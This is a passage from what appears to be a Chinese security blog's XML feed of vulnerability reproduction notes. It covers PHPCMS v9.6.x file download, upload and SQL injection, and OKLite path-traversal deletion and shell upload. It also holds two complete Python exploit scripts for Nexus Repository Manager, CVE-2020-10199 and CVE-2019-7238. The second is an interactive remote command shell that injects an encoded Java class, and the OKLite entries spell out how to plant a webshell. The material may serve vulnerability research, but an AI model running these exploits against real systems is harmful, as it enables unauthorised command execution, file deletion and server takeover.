        <content type="html"><![CDATA[<h1 id="PHPCMS-v9-6-2-任意文件下载"><a href="#PHPCMS-v9-6-2-任意文件下载" class="headerlink" title="PHPCMS_v9.6.2_任意文件下载"></a>PHPCMS_v9.6.2_任意文件下载</h1><h2 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h2><ul><li>PHPCMS v9.6.1</li><li>PHPCMS v9.6.2</li></ul><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>复现的时候需要注意两点：</p><ol><li><p>新安装的 PHPCMS_v9.6.2 目录 \PHPCMS_v9.6.2\caches\caches_commons\caches_data 缺少缓存模型文件 model.cache.php 可以通过复制 PHPCMS_v9.6.1 响应目录的文件得到。</p></li><li><p>通过 xxx.php/ 的方式绕过文件后缀名检测需要在 PHP 版本为 5.2.x 时 才可以成功读取文件。</p></li></ol><p><img src="PHPCMS_v9.6.2_任意文件下载/poc.png" alt="poc.png"></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><a href="http://www.lybbn.cn/data/datas.php?yw=176" target="_blank" rel="noopener">http://www.lybbn.cn/data/datas.php?yw=176</a></li><li><a href="https://www.seebug.org/vuldb/ssvid-93121" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-93121</a></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.1_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.1_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<h1 id="PHPCMS-v9-6-1-任意文件下载"><a href="#PHPCMS-v9-6-1-任意文件下载" class="headerlink" title="PHPCMS_v9.6.1_任意文件下载"></a>PHPCMS_v9.6.1_任意文件下载</h1><h2 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h2><p>PHPCMS v9.6.1</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>注意： 若本地测试 PoC 执行失败可以通过该指定 hosts文件 localhost 为 127.0.0.1 解决。</p><p><img src="PHPCMS_v9.6.1_任意文件下载/poc.png" alt="poc.png"></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><a href="http://bobao.360.cn/learning/detail/3805.html?m=wap&amp;c=index&amp;a=init&amp;siteid=1" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3805.html?m=wap&amp;c=index&amp;a=init&amp;siteid=1</a></li><li><a href="https://www.seebug.org/vuldb/ssvid-92959" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-92959</a></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.0_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.0_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="PHPCMS-v9-6-0-任意文件上传"><a href="#PHPCMS-v9-6-0-任意文件上传" class="headerlink" title="PHPCMS_v9.6.0_任意文件上传"></a>PHPCMS_v9.6.0_任意文件上传</h1><h2 id="Official"><a href="#Official" class="headerlink" title="Official"></a>Official</h2><p><a href="http://bbs.phpcms.cn/thread-936226-1-1.html" target="_blank" rel="noopener">http://bbs.phpcms.cn/thread-936226-1-1.html</a></p><h2 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h2><p>PHPCMS v9.6.0</p><p><strong>github获取脚本</strong></p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>注意： 每次测试后都需要把 poc.py 中 post data 的 username 和 email 修改一遍。</p><p><img src="PHPCMS_v9.6.0_任意文件上传/poc.png" alt="poc.png"></p><p>使用菜刀连接：</p><p><img src="PHPCMS_v9.6.0_任意文件上传/caidao1.png" alt="caidao1.png"></p><p><img src="PHPCMS_v9.6.0_任意文件上传/caidao2.png" alt="caidao2.png"></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><a href="http://www.evilclay.com/2017/05/10/PHPCMSv9-6-0任意文件上传漏洞分析/" target="_blank" rel="noopener">http://www.evilclay.com/2017/05/10/PHPCMSv9-6-0任意文件上传漏洞分析/</a></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.0_SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.0_SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="PHPCMS-v9-6-0-SQL注入"><a href="#PHPCMS-v9-6-0-SQL注入" class="headerlink" title="PHPCMS_v9.6.0_SQL注入"></a>PHPCMS_v9.6.0_SQL注入</h1><h2 id="Official"><a href="#Official" class="headerlink" title="Official"></a>Official</h2><p><a href="http://bbs.phpcms.cn/thread-936226-1-1.html" target="_blank" rel="noopener">http://bbs.phpcms.cn/thread-936226-1-1.html</a></p><h2 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h2><p>PHPCMS v9.6.0</p><p><strong>github获取脚本</strong></p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p><img src="PHPCMS_v9.6.0_SQL注入/poc.png" alt></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><a href="https://zhuanlan.zhihu.com/p/26263513" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/26263513</a></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16132%20OKLite%20v1.2.25%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16132%20OKLite%20v1.2.25%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>OKLite v1.2.25 存在任意文件删除漏洞</p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Ethan发现OKLite v1.2.25 存在任意文件删除漏洞（需要登录后台）</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>后台删除文件时抓包修改<code>title</code>参数可以直接删除网站任意文件</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><h3 id="产品"><a href="#产品" class="headerlink" title="产品"></a>产品</h3><blockquote><p>OKLite</p></blockquote><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><blockquote><p>OKLite v1.2.25 版本  </p></blockquote><h3 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h3><blockquote><p>OKLite  </p></blockquote><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>在主目录下创建一个index.txt用来测试</p><p>登录后台，在设置-&gt;风格管理</p><p>点击文件管理</p><p>随便删除一个文件，点击抓包，修改title参数为../../test.txt</p><p>发送请求，主目录下的test.txt已被删除</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16131%20OKLite%20v1.2.25%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/OKLite/CVE-2019-16131%20OKLite%20v1.2.25%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>OKLite v1.2.25 存在任意文件上传漏洞</p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Ethan发现OKLite v1.2.25 存在任意文件上传漏洞（需要登录后台）</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>直接上传getshell</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><h3 id="产品"><a href="#产品" class="headerlink" title="产品"></a>产品</h3><blockquote><p>OKLite</p></blockquote><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><blockquote><p>OKLite v1.2.25 版本  </p></blockquote><h3 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h3><blockquote><p>OKLite  </p></blockquote><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>登录后台，点击模块管理  </p><p>编辑一个测试文件test.php,压缩为test.zip上传。 </p><p>然后导入模块</p><p>点击开始上传，上传shell生成在解压主目录下面</p><p>访问<code>http://127.0.0.1:8888/1.2.25/data/cache/test.php</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Nexus/cve-2020-10199/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Nexus/cve-2020-10199/</url>
      
        <content type="html"><![CDATA[<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"># author:zhzyker</span><br><span class="line"># from:https://github.com/zhzyker/exphub</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">if len(sys.argv)!=5:</span><br><span class="line">    print('+----------------------------------------------------------------------------------------------------------+')</span><br><span class="line">    print('+ DES: by zhzyker as https://github.com/zhzyker/exphub                                                     +')</span><br><span class="line">    print('+      CVE-2020-10199 need username &amp; password                                                             +')</span><br><span class="line">    print('+----------------------------------------------------------------------------------------------------------+')</span><br><span class="line">    print('+ USE: python3 <span class="tag">&lt;<span class="name">filename</span>&gt;</span> <span class="tag">&lt;<span class="name">ip</span>&gt;</span> <span class="tag">&lt;<span class="name">port</span>&gt;</span> <span class="tag">&lt;<span class="name">csrf</span>&gt;</span> <span class="tag">&lt;<span class="name">sessionid</span>&gt;</span>                                                   +')</span><br><span class="line">    print('+ EXP: python3 cve-2020-10199_poc.py 1.1.1.1 8081 0.9567822851573897 edfca15e-c721-45e2-bdef-e8b3c6364ddb  +')</span><br><span class="line">    print('+ VER: Nexus Repository Manager OSS/Pro version <span class="tag">&lt;<span class="name">=</span> <span class="attr">3.21.1</span>                                                  +')</span></span><br><span class="line"><span class="tag">    <span class="attr">print</span>('+<span class="attr">----------------------------------------------------------------------------------------------------------</span>+')</span></span><br><span class="line"><span class="tag">    <span class="attr">sys.exit</span>()</span></span><br><span class="line"><span class="tag"><span class="attr">ip</span> = <span class="string">sys.argv[1]</span></span></span><br><span class="line"><span class="tag"><span class="attr">port</span> = <span class="string">sys.argv[2]</span></span></span><br><span class="line"><span class="tag"><span class="attr">csrf</span> = <span class="string">sys.argv[3]</span></span></span><br><span class="line"><span class="tag"><span class="attr">sessionid</span> = <span class="string">sys.argv[4]</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">url</span> = <span class="string">"http://"</span>+<span class="attr">ip</span>+"<span class="attr">:</span>"+<span class="attr">port</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">headers</span> = <span class="string">&#123;</span></span></span><br><span class="line"><span class="tag">    "<span class="attr">Host</span>"<span class="attr">:</span> "%<span class="attr">s:</span>%<span class="attr">s</span>" % (<span class="attr">ip</span>, <span class="attr">port</span>),</span></span><br><span class="line"><span class="tag">    "<span class="attr">Referer</span>"<span class="attr">:</span> <span class="attr">url</span>,</span></span><br><span class="line"><span class="tag">    "<span class="attr">X-Nexus-UI</span>"<span class="attr">:</span> "<span class="attr">true</span>",</span></span><br><span class="line"><span class="tag">    "<span class="attr">X-Requested-With</span>"<span class="attr">:</span> "<span class="attr">XMLHttpRequest</span>",</span></span><br><span class="line"><span class="tag">    "<span class="attr">NX-ANTI-CSRF-TOKEN</span>"<span class="attr">:</span> <span class="attr">csrf</span>,</span></span><br><span class="line"><span class="tag">    "<span class="attr">User-Agent</span>"<span class="attr">:</span> "<span class="attr">Mozilla</span>/<span class="attr">5.0</span> (<span class="attr">Macintosh</span>; <span class="attr">Intel</span> <span class="attr">Mac</span> <span class="attr">OS</span> <span class="attr">X</span> <span class="attr">10.15</span>; <span class="attr">rv:73.0</span>) <span class="attr">Gecko</span>/<span class="attr">20100101</span> <span class="attr">Firefox</span>/<span class="attr">73.0</span>",</span></span><br><span class="line"><span class="tag">    "<span class="attr">Accept</span>"<span class="attr">:</span> "<span class="attr">application</span>/<span class="attr">json</span>, <span class="attr">text</span>/<span class="attr">plain</span>, */*",</span></span><br><span class="line"><span class="tag">    "<span class="attr">Accept-Language</span>"<span class="attr">:</span> "<span class="attr">zh-CN</span>,<span class="attr">zh</span>;<span class="attr">q</span>=<span class="string">0.8,zh-TW;q</span>=<span class="string">0.7,zh-HK;q</span>=<span class="string">0.5,en-US;q</span>=<span class="string">0.3,en;q</span>=<span class="string">0.2</span>",</span></span><br><span class="line"><span class="tag">    "<span class="attr">Accept-Encoding</span>"<span class="attr">:</span> "<span class="attr">gzip</span>, <span class="attr">deflate</span>",</span></span><br><span class="line"><span class="tag">    "<span class="attr">Content-Type</span>"<span class="attr">:</span> "<span class="attr">application</span>/<span class="attr">json</span>",</span></span><br><span class="line"><span class="tag">    "<span class="attr">Cookie</span>"<span class="attr">:</span> "<span class="attr">NX-ANTI-CSRF-TOKEN</span>=<span class="string">%s;</span> <span class="attr">NXSESSIONID</span>=<span class="string">%s</span>" % (<span class="attr">csrf</span>, <span class="attr">sessionid</span>),</span></span><br><span class="line"><span class="tag">    "<span class="attr">Origin</span>"<span class="attr">:</span> <span class="attr">url</span>,</span></span><br><span class="line"><span class="tag">    "<span class="attr">Connection</span>"<span class="attr">:</span> "<span class="attr">close</span>"</span></span><br><span class="line"><span class="tag">    &#125;</span></span><br><span class="line"><span class="tag">    </span></span><br><span class="line"><span class="tag"><span class="attr">vulurl</span>=<span class="string">url+</span>"/<span class="attr">service</span>/<span class="attr">rest</span>/<span class="attr">beta</span>/<span class="attr">repositories</span>/<span class="attr">go</span>/<span class="attr">group</span>"</span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">payload</span> = <span class="string">&#123;</span>"<span class="attr">name</span>"<span class="attr">:</span> "<span class="attr">internal</span>", "<span class="attr">online</span>"<span class="attr">:</span> "<span class="attr">true</span>", "<span class="attr">storage</span>"<span class="attr">:</span> &#123;"<span class="attr">blobStoreName</span>"<span class="attr">:</span> "<span class="attr">default</span>", "<span class="attr">strictContentTypeValidation</span>"<span class="attr">:</span> "<span class="attr">true</span>"&#125;, "<span class="attr">group</span>"<span class="attr">:</span> &#123;"<span class="attr">memberNames</span>"<span class="attr">:</span> ["$\\<span class="attr">A</span>&#123;<span class="attr">233</span>*<span class="attr">233</span>&#125;"]&#125;&#125;</span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">r</span> = <span class="string">requests.post(vulurl,</span> <span class="attr">data</span>=<span class="string">json.dumps(payload),</span> <span class="attr">headers</span>=<span class="string">headers)</span></span></span><br><span class="line"><span class="tag"><span class="attr">print</span> (<span class="attr">r.text</span>)</span></span><br><span class="line"><span class="tag"><span class="attr">if</span> "<span class="attr">A54289</span>" <span class="attr">in</span> <span class="attr">r.text:</span></span></span><br><span class="line"><span class="tag">    <span class="attr">print</span> ("[+] <span class="attr">CVE-2020-10199</span> <span class="attr">vulnerability</span> <span class="attr">exists.</span> <span class="attr">exp</span> <span class="attr">as</span> <span class="attr">https:</span>//<span class="attr">github.com</span>/<span class="attr">zhzyker</span>/<span class="attr">exphub</span>")</span></span><br><span class="line"><span class="tag"><span class="attr">else:</span></span></span><br><span class="line"><span class="tag">    <span class="attr">print</span> ("[<span class="attr">-</span>] <span class="attr">CVE-2020-10199</span> <span class="attr">vulnerability</span> <span class="attr">does</span> <span class="attr">not</span> <span class="attr">exist.</span>")</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Nexus/cve-2019-7238_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Nexus/cve-2019-7238_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line"># author:zhzyker</span><br><span class="line"># from:https://github.com/zhzyker/exphub</span><br><span class="line"># telegram:t.me/zhzyker</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">if len(sys.argv)!=2:</span><br><span class="line">    print('+-------------------------------------------------------------+')</span><br><span class="line">    print('+ DES: by zhzyker as https://github.com/zhzyker/exphub        +')</span><br><span class="line">    print('+      Nexus Repository Manager 3 remote command execution    +')</span><br><span class="line">    print('+-------------------------------------------------------------+')</span><br><span class="line">    print('+ USE: python3 <span class="tag">&lt;<span class="name">filename</span>&gt;</span> <span class="tag">&lt;<span class="name">url</span>&gt;</span>                               +')</span><br><span class="line">    print('+ EXP: python3 struts2-032_cmd.py http://freeerror.org:8081   +')</span><br><span class="line">    print('+ VER: Nexus Repository Manager OSS/Pro 3.6.2 -3.14.0         +')</span><br><span class="line">    print('+-------------------------------------------------------------+')</span><br><span class="line">    sys.exit()</span><br><span class="line">url = sys.argv[1]</span><br><span class="line">cmd = "whoami"</span><br><span class="line">vuln = url + "/service/extdirect"  </span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0",</span><br><span class="line">'Accept': "*/*",</span><br><span class="line">'Content-Type': "application/json",</span><br><span class="line">'X-Requested-With': "XMLHttpRequest",</span><br><span class="line">'Connection': "close",</span><br><span class="line">'Cache-Control': "no-cache"</span><br><span class="line">&#125;</span><br><span class="line">def exp(cmd):</span><br><span class="line">    payload = "&#123;\"action\": \"coreui_Component\", \"type\": \"rpc\", \"tid\": 8, \"data\": [&#123;\"sort\": [&#123;\"direction\": \"ASC\", \"property\": \"name\"&#125;], \"start\": 0, \"filter\": [&#123;\"property\": \"repositoryName\", \"value\": \"*\"&#125;, &#123;\"property\": \"expression\", \"value\": \"function(x, y, z, c, integer, defineClass)&#123;   c=1.class.forName('java.lang.Character');   integer=1.class;   x='cafebabe0000003100ae0a001f00560a005700580a005700590a005a005b0a005a005c0a005d005e0a005d005f0700600a000800610a006200630700640800650a001d00660800410a001d00670a006800690a0068006a08006b08004508006c08006d0a006e006f0a006e00700a001f00710a001d00720800730a000800740800750700760a001d00770700780a0079007a08007b08007c07007d0a0023007e0a0023007f0700800100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100114c4578706c6f69742f546573743233343b01000474657374010015284c6a6176612f6c616e672f537472696e673b29560100036f626a0100124c6a6176612f6c616e672f4f626a6563743b0100016901000149010003636d640100124c6a6176612f6c616e672f537472696e673b01000770726f636573730100134c6a6176612f6c616e672f50726f636573733b01000269730100154c6a6176612f696f2f496e70757453747265616d3b010006726573756c740100025b42010009726573756c745374720100067468726561640100124c6a6176612f6c616e672f5468726561643b0100056669656c640100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01000c7468726561644c6f63616c7301000e7468726561644c6f63616c4d61700100114c6a6176612f6c616e672f436c6173733b01000a7461626c654669656c640100057461626c65010005656e74727901000a76616c75654669656c6401000e68747470436f6e6e656374696f6e01000e48747470436f6e6e656374696f6e0100076368616e6e656c01000b487474704368616e6e656c010008726573706f6e7365010008526573706f6e73650100067772697465720100154c6a6176612f696f2f5072696e745772697465723b0100164c6f63616c5661726961626c65547970655461626c650100144c6a6176612f6c616e672f436c6173733c2a3e3b01000a457863657074696f6e7307008101000a536f7572636546696c6501000c546573743233342e6a6176610c002700280700820c008300840c008500860700870c008800890c008a008b07008c0c008d00890c008e008f0100106a6176612f6c616e672f537472696e670c002700900700910c009200930100116a6176612f6c616e672f496e74656765720100106a6176612e6c616e672e5468726561640c009400950c009600970700980c0099009a0c009b009c0100246a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617001002a6a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617024456e74727901000576616c756507009d0c009e009f0c009b00a00c00a100a20c00a300a40100276f72672e65636c697073652e6a657474792e7365727665722e48747470436f6e6e656374696f6e0c00a500a601000e676574487474704368616e6e656c01000f6a6176612f6c616e672f436c6173730c00a700a80100106a6176612f6c616e672f4f626a6563740700a90c00aa00ab01000b676574526573706f6e73650100096765745772697465720100136a6176612f696f2f5072696e745772697465720c00ac002f0c00ad002801000f4578706c6f69742f546573743233340100136a6176612f6c616e672f457863657074696f6e0100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b01000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000777616974466f7201000328294901000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0100136a6176612f696f2f496e70757453747265616d010009617661696c61626c6501000472656164010007285b4249492949010005285b4229560100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b010007666f724e616d65010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c6401000d73657441636365737369626c65010004285a2956010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100176a6176612f6c616e672f7265666c6563742f41727261790100096765744c656e677468010015284c6a6176612f6c616e672f4f626a6563743b2949010027284c6a6176612f6c616e672f4f626a6563743b49294c6a6176612f6c616e672f4f626a6563743b010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b0100076765744e616d6501001428294c6a6176612f6c616e672f537472696e673b010006657175616c73010015284c6a6176612f6c616e672f4f626a6563743b295a0100096765744d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b0100186a6176612f6c616e672f7265666c6563742f4d6574686f64010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100057772697465010005636c6f736500210026001f000000000002000100270028000100290000002f00010001000000052ab70001b100000002002a00000006000100000009002b0000000c000100000005002c002d00000009002e002f0002002900000304000400140000013eb800022ab600034c2bb60004572bb600054d2cb60006bc084e2c2d032cb60006b6000757bb0008592db700093a04b8000a3a05120b57120cb8000d120eb6000f3a06190604b6001019061905b600113a07120b571212b8000d3a0819081213b6000f3a09190904b6001019091907b600113a0a120b571214b8000d3a0b190b1215b6000f3a0c190c04b60010013a0d03360e150e190ab80016a2003e190a150eb800173a0f190fc70006a70027190c190fb600113a0d190dc70006a70016190db60018b60019121ab6001b990006a70009840e01a7ffbe190db600183a0e190e121c03bd001db6001e190d03bd001fb600203a0f190fb600183a101910122103bd001db6001e190f03bd001fb600203a111911b600183a121912122203bd001db6001e191103bd001fb60020c000233a1319131904b600241913b60025b100000003002a0000009600250000001600080017000d0018001200190019001a0024001b002e001d0033001f004200200048002100510023005b002500640026006a002700730029007d002a0086002b008c002d008f002f009c003100a5003200aa003300ad003500b6003600bb003700be003900ce003a00d1002f00d7003d00de003e00f4003f00fb004001110041011800420131004401380045013d0049002b000000de001600a5002c00300031000f0092004500320033000e0000013e003400350000000801360036003700010012012c00380039000200190125003a003b0003002e0110003c003500040033010b003d003e0005004200fc003f00400006005100ed004100310007005b00e3004200430008006400da004400400009007300cb00450031000a007d00c100460043000b008600b800470040000c008f00af00480031000d00de006000490043000e00f4004a004a0031000f00fb0043004b004300100111002d004c0031001101180026004d004300120131000d004e004f00130050000000340005005b00e3004200510008007d00c100460051000b00de006000490051000e00fb0043004b0051001001180026004d005100120052000000040001005300010054000000020055';   y=0;   z='';   while (y lt x.length())&#123;   z += c.toChars(integer.parseInt(x.substring(y, y+2), 16))[0];   y += 2;   &#125;;defineClass=2.class.forName('java.lang.Thread');x=defineClass.getDeclaredMethod('currentThread').invoke(null);y=defineClass.getDeclaredMethod('getContextClassLoader').invoke(x);defineClass=2.class.forName('java.lang.ClassLoader').getDeclaredMethod('defineClass','1'.class,1.class.forName('[B'),1.class.forName('[I').getComponentType(),1.class.forName('[I').getComponentType()); \\ndefineClass.setAccessible(true);\\nx=defineClass.invoke(\\ny,\\n   'Exploit.Test234',\\nz.getBytes('latin1'),0,\\n3054\\n);x.getMethod('test', ''.class).invoke(null, '%s');'done!'&#125;\\n\"&#125;, &#123;\"property\": \"type\", \"value\": \"jexl\"&#125;], \"limit\": 50, \"page\": 1&#125;], \"method\": \"previewAssets\"&#125;" % cmd</span><br><span class="line">    r =requests.post(vuln, data=payload,headers=headers, verify=False)</span><br><span class="line">    if r.status_code ==200:</span><br><span class="line">        print (r.text)</span><br><span class="line">    else: </span><br><span class="line">        print ("[-] Target "+url+" Not CVE-2019-7238")</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">while 1:</span><br><span class="line">    cmd = input("Shell &gt;&gt;&gt; ")</span><br><span class="line">    if cmd == "exit" : exit(0)</span><br><span class="line">    exp(cmd)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
